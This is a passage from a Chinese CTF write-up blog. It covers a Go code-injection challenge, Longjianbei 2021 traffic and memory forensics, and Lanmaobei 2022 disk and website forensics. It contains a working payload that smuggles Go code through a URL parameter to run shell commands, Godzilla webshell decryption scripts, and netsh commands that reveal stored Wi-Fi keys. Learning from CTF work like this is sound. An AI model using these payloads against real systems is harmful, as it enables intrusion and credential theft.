keyword">return</span>     <span class="token punctuation">}</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>eval<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打个断点查看下生成的 code</p><p><img src="/../../../../pic/Pasted%20image%2020230218103750.png"></p><p>运行结果</p><p><img src="/../../../../pic/Pasted%20image%2020230218103527.png"></p><p>成功实现命令执行</p><p>构造 payload</p><pre class="line-numbers language-none"><code class="language-none">[GET]/backdoor?pkg=os%2Fexec%22%0A%22fmt%22%0A)%0A%0A%0A%0Afunc%09init()%09%7B%0Acommand%3A%3Dexec.Command("/bin/sh","-c","cat$IFS/ffflllaaaggg")%0A%09output%2C_%3A%3Dcommand.Output()%0A%09fmt.Println(string(output))%0A%7D%0Aconst(%0Aa%3D%22fmt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>参考资料</li></ul><p><a href="https://learnku.com/articles/57884">有了它，Golang 也能 Eval 了 | Go 技术论坛 (learnku.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯 2021</title>
      <link href="/2023/01/21/catchtheflag/games/long-jian-bei/long-jian-bei-2021/"/>
      <url>/2023/01/21/catchtheflag/games/long-jian-bei/long-jian-bei-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="陇剑杯-2021"><a href="#陇剑杯-2021" class="headerlink" title="陇剑杯 2021"></a>陇剑杯 2021</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-ios"><a href="#1-ios" class="headerlink" title="1. ios"></a>1. ios</h3><p>#流量分析 #日志取证</p><p>一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：</p><h4 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h4><ul><li>题目描述</li></ul><p>黑客所控制的C&amp;C服务器IP是_____________。</p><ul><li>题目解析</li></ul><p>在第十五个流下找到了可疑流量</p><p><img src="/../../../../pic/Pasted%20image%2020230216194530.png"></p><p>获得结果  3.128.156.159</p><h4 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h4><ul><li>题目描述</li></ul><p>黑客利用的Github开源项目的名字是______。</p><ul><li>题目解析</li></ul><p>在第十五个流下</p><p><img src="/../../../../pic/Pasted%20image%2020230216194821.png"></p><p>获得结果 stowaway</p><h4 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h4><ul><li>题目描述</li></ul><p>通讯加密密钥的明文是____________。</p><ul><li>题目解析</li></ul><p>查看下 github 上项目说明</p><p><img src="/../../../../pic/Pasted%20image%2020230216194923.png"></p><p>根据前面获得结果 hack4sec</p><h4 id="问4"><a href="#问4" class="headerlink" title="问4"></a>问4</h4><ul><li>题目描述</li></ul><p>黑客通过SQL盲注拿到了一个敏感数据，内容是____________。</p><ul><li>题目解析</li></ul><p>并没有找到盲注的流量，附件下还给了一个秘钥文件，导入为 TLS 秘钥</p><p><img src="/../../../../pic/Pasted%20image%2020230216195443.png"></p><p>过滤出来 http2 的流量</p><p><img src="/../../../../pic/Pasted%20image%2020230216195528.png"></p><p>找到盲注的流量导出来</p><p><img src="/../../../../pic/Pasted%20image%2020230216200514.png"></p><p>使用 golang 处理</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main    <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token string">"bufio"</span>   <span class="token string">"encoding/hex"</span>   <span class="token string">"fmt"</span>   <span class="token string">"io"</span>   <span class="token string">"log"</span>   <span class="token string">"os"</span>   <span class="token string">"regexp"</span>   <span class="token string">"strconv"</span>   <span class="token string">"syscall"</span><span class="token punctuation">)</span>    <span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     srcfile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>     <span class="token punctuation">}</span>     <span class="token keyword">defer</span> srcfile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>srcfile<span class="token punctuation">)</span>     result <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>        line<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span>           <span class="token keyword">break</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>           <span class="token keyword">return</span>        <span class="token punctuation">}</span>        r <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`password%2C(\w*)%2C1%29%29_from_user%29%3D%22(\w*)%22`</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span><span class="token function">MatchString</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token punctuation">{</span>           submatch <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FindStringSubmatch</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>           result<span class="token punctuation">[</span>submatch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> submatch<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> j<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> result <span class="token punctuation">{</span>           index<span class="token punctuation">,</span> err <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>           <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>              <span class="token keyword">return</span>           <span class="token punctuation">}</span>           <span class="token keyword">if</span> i <span class="token operator">==</span> index <span class="token punctuation">{</span>              decodeString<span class="token punctuation">,</span> err <span class="token operator">:=</span> hex<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>              <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>                 <span class="token keyword">return</span>              <span class="token punctuation">}</span>              fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>decodeString<span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token punctuation">}</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后获得结果 746558f3-c841-456b-85d7-d6c0f2edabb2 </p><p>这里把后面的 ZZZ 去掉</p><h4 id="问5"><a href="#问5" class="headerlink" title="问5"></a>问5</h4><ul><li>题目描述</li></ul><p>黑客端口扫描的扫描器的扫描范围是____________。</p><ul><li>题目解析</li></ul><p>搜索下 RST 流量</p><p>分析 -&gt; 专家信息 -&gt; RST</p><p><img src="/../../../../pic/Pasted%20image%2020230216203725.png"></p><p>获得结果 10-499</p><h4 id="问6"><a href="#问6" class="headerlink" title="问6"></a>问6</h4><ul><li>题目描述</li></ul><p>被害者手机上被拿走了的私钥文件内容是____________。</p><ul><li>题目解析</li></ul><p>零解</p><h4 id="问7"><a href="#问7" class="headerlink" title="问7"></a>问7</h4><ul><li>题目描述</li></ul><p>黑客访问/攻击了内网的几个服务器，IP地址为____________。</p><ul><li>题目解析</li></ul><p>查看附件下的 access.log </p><p><img src="/../../../../pic/Pasted%20image%2020230217062718.png"></p><p>还访问了 172.28.0.2 下的文件</p><p>结合之前 SQL 注入的 ip 可知题目答案为 172.28.0.2#192.168.1.12</p><h4 id="问8"><a href="#问8" class="headerlink" title="问8"></a>问8</h4><ul><li>题目描述</li></ul><p>黑客写入了一个webshell，其密码为____________。</p><ul><li>题目解析</li></ul><p>一样是查看 access.log</p><p><img src="/../../../../pic/Pasted%20image%2020230217062918.png"></p><p>获得答案 fxxk</p><h3 id="2-wifi"><a href="#2-wifi" class="headerlink" title="2. wifi"></a>2. wifi</h3><p>#流量分析 #内存取证 #流量混淆 #wifi破解 #哥斯拉解密</p><ul><li>题目描述</li></ul><p>网管小王最近喜欢上了ctf网络安全竞赛，他使用“哥斯拉”木马来玩玩upload-labs，并且保存了内存镜像、wifi流量和服务器流量，让您来分析后作答：<br>小王往upload-labs上传木马后进行了cat /flag，flag内容为_____________。（压缩包里有解压密码的提示，需要额外添加花括号）。</p><ul><li>题目解析</li></ul><p>下载下来附件</p><p>附件中给出的服务器的流量包只有一些请求信息</p><p>在客户端流量包中为加密的 WIFI 流量</p><p><img src="/../../../../pic/Pasted%20image%2020230306034006.png"></p><p>还是能看到 WIFI 的名称为 My_Wifi</p><p>想要解密获取明文信息的话就需要去获取 WIFI 的密码</p><p>在 Windows 系统中，连接过的 WIFI 信息都会被保存下来，包括密码也会被保存</p><p>查看 WIFI 的相关信息</p><pre class="line-numbers language-none"><code class="language-none">netsh wlan show profiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230306034342.png"></p><p>查看 WIFI 的具体密码</p><pre class="line-numbers language-none"><code class="language-none">netsh wlan show profiles "@6" key=clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230306034458.png"></p><p>既然能查到说明这些内容都被保存在某个文件中</p><p>保存路径为 <code>C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\[网卡Guid]</code></p><p>搜索一下目录</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">python3 .\vol.py -f '.\Windows 7-dde00fa9.vmem' windows.filescan | findstr "\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230306035947.png"></p><p>但是并没有存储配置文件，难道给删了？</p><p>不过就算找到了配置文件似乎也没什么作用，没找到相关的解密方法</p><p>那就以 WIFI 名搜索一下，总不能给个 WIFI 啥信息也不给了</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">python3 .\vol.py -f '.\Windows 7-dde00fa9.vmem' windows.filescan | findstr "My_Wifi"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230306041103.png"></p><p>找到一个，导出来</p><pre class="line-numbers language-none"><code class="language-none">python3 .\vol.py -f '.\Windows 7-dde00fa9.vmem' windows.dumpfiles --physaddr 0x3fdc38c8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230306041313.png"></p><p>提示密码为网络的 GUID，这不就是刚搜索文件名吗</p><p>使用 <code>{529B7D2A-05D1-4F21-A001-8F4FF817FC3A}</code> 解压</p><p>打开之后获得 WIFI 密码明文</p><p><img src="/../../../../pic/Pasted%20image%2020230306041440.png"></p><p>去 Wireshark 里设置下解密秘钥</p><p><img src="/../../../../pic/Pasted%20image%2020230306041721.png"></p><p>由于是查看 WebShell 的传输内容，这里还是导出 HTTP 的流量</p><p><img src="/../../../../pic/Pasted%20image%2020230306042045.png"></p><p>结合服务器的流量查看下传入的 WebShell 的内容</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">php -r "echo(base64_decode(strrev(urldecode('K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBXayR3coAiZpBCIgACIgACIK0welNHbl1HIgACIK0wOpYTMskSeltGJuM3chBHJoUDZthic0NnY1NHIvh2YlBCIgACIgACIK0wOpkSeltGJskSY0FGZkgib1JHQoUGZvNmblhSZk92YuV2X0YTZzFmYg8GajVGIgACIgACIgoQD7kiNxwCMskSeltGJuM3chBHJoUDZthic0NnY1NHIvh2YlBCIgACIgACIK0wOpQWYvxWehBHJowWY2VGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD'))));"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230306042402.png"></p><p>可以看出使用的是 php_xor_base64 的加密器</p><p>如果看不出可以用哥斯拉生成对比一下使用的是什么加密器</p><p>接下来就是对哥斯拉的数据包解密了  </p><p>对于哥斯拉POST的数据包使用这个脚本解密</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">;</span><span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxxxxxx'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于哥斯拉的返回包使用这个脚本解密</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">;</span><span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token comment">// 原来的数据去掉前十六位和后十六位然后解密</span><span class="token keyword">echo</span> <span class="token function">gzdecode</span><span class="token punctuation">(</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要还是查看一下服务器的返回包，将 HTTP 数据包导出</p><p>将一些不相关的删除之后保存下来四个</p><p><img src="/../../../../pic/Pasted%20image%2020230306043251.png"></p><p>使用解密脚本分别进行解密</p><p>最后获得 flag 为 <code>flag{5db5b7b0bb74babb66e1522f3a6b1b12}</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 陇剑杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯 2022 初赛</title>
      <link href="/2023/01/21/catchtheflag/games/lan-mao-bei/lan-mao-bei-2022-chu-sai/"/>
      <url>/2023/01/21/catchtheflag/games/lan-mao-bei/lan-mao-bei-2022-chu-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝帽杯-2022-初赛"><a href="#蓝帽杯-2022-初赛" class="headerlink" title="蓝帽杯 2022 初赛"></a>蓝帽杯 2022 初赛</h1><h2 id="1-计算机取证"><a href="#1-计算机取证" class="headerlink" title="1. 计算机取证"></a>1. 计算机取证</h2><p>#计算机取证</p><h3 id="1-1-计算机取证-1"><a href="#1-1-计算机取证-1" class="headerlink" title="1.1 计算机取证_1"></a>1.1 计算机取证_1</h3><ul><li>题目描述</li></ul><p>从内存镜像中获得taqi7的开机密码是多少？</p><ul><li>题目解析</li></ul><p>丢到 Passware Kit Forensic 中分析一下</p><p><img src="/../../../../pic/Pasted%20image%2020230211142452.png"></p><p>选择镜像文件然后勾选上 Windows</p><p><img src="/../../../../pic/Pasted%20image%2020230211142630.png"></p><p>获取到密码为 anxinqi</p><h3 id="1-2-计算机取证-2"><a href="#1-2-计算机取证-2" class="headerlink" title="1.2 计算机取证_2"></a>1.2 计算机取证_2</h3><ul><li>题目描述</li></ul><p>制作该内存镜像的进程Pid号是多少？</p><ul><li>题目解析</li></ul><p>使用 <a href="https://github.com/volatilityfoundation/volatility3">volatility3</a> 读取下进行列表</p><pre class="line-numbers language-none"><code class="language-none">python3 vol.py -f 1.dmp windows.pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230211143052.png"></p><p>存在 MagnetRAMCapture，这个应用专用来制作镜像</p><p>所以结果为 2192</p><h3 id="1-3-计算机取证-3"><a href="#1-3-计算机取证-3" class="headerlink" title="1.3 计算机取证_3"></a>1.3 计算机取证_3</h3><ul><li>题目描述</li></ul><p>bitlokcer分区某office文件中存在的flag值为？（答案参考格式：NSSCTF{abcABC123}）</p><ul><li>题目解析</li></ul><p>丢到 Passware Kit Forensic 使用内存镜像和加密卷进行解密</p><p><img src="/../../../../pic/Pasted%20image%2020230211143409.png"></p><p>选择好加密卷以及内存镜像</p><p><img src="/../../../../pic/Pasted%20image%2020230211143440.png"></p><p>获得未加密的内容</p><p>使用 AccessData FTK Imager 打开未加密内容</p><p><img src="/../../../../pic/Pasted%20image%2020230211144708.png"></p><p>给了一个 pass 列表，而且 pptx 与 docx 文件都被加密</p><p>继续丢到 Passware Kit Forensic 破解</p><p><img src="/../../../../pic/Pasted%20image%2020230211152018.png"></p><p>打开文件</p><p><img src="/../../../../pic/Pasted%20image%2020230211152158.png"></p><p>获得结果 flag{b27867b66866866686866883bb43536}</p><h3 id="1-4-计算机取证-4"><a href="#1-4-计算机取证-4" class="headerlink" title="1.4 计算机取证_4"></a>1.4 计算机取证_4</h3><ul><li>题目描述</li></ul><p>TrueCrypt加密中存在的flag值为？（答案参考格式：flag{abcABC123}）</p><ul><li>题目解析</li></ul><p>将 bitlokcer 分区中还找到一个新建文本文档，推测为要解密的 TrueCrypt，修改文件后缀为 tc</p><p><img src="/../../../../pic/Pasted%20image%2020230211153200.png"></p><p>选择好内存映像与 tc 文件</p><p><img src="/../../../../pic/Pasted%20image%2020230211153216.png"></p><p>获得未加密内容</p><p><img src="/../../../../pic/Pasted%20image%2020230211153654.png"></p><p>存在加密内容</p><p>导出来</p><p><img src="/../../../../pic/Pasted%20image%2020230211153837.png"></p><p>获得密码 991314</p><p>打开哈哈哈.txt</p><p><img src="/../../../../pic/Pasted%20image%2020230211153858.png"></p><p>获得结果 flag{1349934913913991394cacacacacacc}</p><h2 id="2-网站取证"><a href="#2-网站取证" class="headerlink" title="2. 网站取证"></a>2. 网站取证</h2><p>#流量分析</p><h3 id="2-1-网站取证-1"><a href="#2-1-网站取证-1" class="headerlink" title="2.1 网站取证_1"></a>2.1 网站取证_1</h3><ul><li>题目描述</li></ul><p>据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。<br>请从网站源码中找出木马文件，并提交木马连接的密码。</p><ul><li>题目解析</li></ul><p>丢给火绒查杀一下</p><p><img src="/../../../../pic/Pasted%20image%2020230211154558.png"></p><p>直接给找到了</p><p><img src="/../../../../pic/Pasted%20image%2020230211154627.png"></p><p>获得 flag 为 <code>lanmaobei666</code></p><h3 id="2-2-网站取证-2"><a href="#2-2-网站取证-2" class="headerlink" title="2.2 网站取证_2"></a>2.2 网站取证_2</h3><ul><li>题目描述</li></ul><p>请提交数据库连接的明文密码</p><ul><li>题目解析</li></ul><p>查看下配置文件</p><p><img src="/../../../../pic/Pasted%20image%2020230211155356.png"></p><p>密码被加密过，找一下加密的代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">my_encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'P3LMJ4uCbkFJ/RarywrCvA=='</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/r/n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'PanGuShi'</span><span class="token punctuation">;</span>    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$td</span> <span class="token operator">=</span> <span class="token function">mcrypt_module_open</span><span class="token punctuation">(</span><span class="token constant">MCRYPT_RIJNDAEL_128</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token constant">MCRYPT_MODE_CBC</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mcrypt_generic_init</span><span class="token punctuation">(</span><span class="token variable">$td</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"PanGuShi"</span><span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dencrypted</span> <span class="token operator">=</span> <span class="token function">mdecrypt_generic</span><span class="token punctuation">(</span><span class="token variable">$td</span><span class="token punctuation">,</span> <span class="token variable">$decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mcrypt_generic_deinit</span><span class="token punctuation">(</span><span class="token variable">$td</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mcrypt_module_close</span><span class="token punctuation">(</span><span class="token variable">$td</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dencrypted</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$dencrypted</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$dencrypted</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<a href="https://code.y444.cn/php">在线网站</a>运行一下</p><p><img src="/../../../../pic/Pasted%20image%2020230211160356.png"></p><p>获得 flag 为 <code>KBLT123</code></p><h3 id="2-3-网站取证-3"><a href="#2-3-网站取证-3" class="headerlink" title="2.3 网站取证_3"></a>2.3 网站取证_3</h3><ul><li>题目描述</li></ul><p>请提交数据库金额加密混淆使用的盐值。</p><ul><li>题目解析</li></ul><p>全局搜索 money</p><p><img 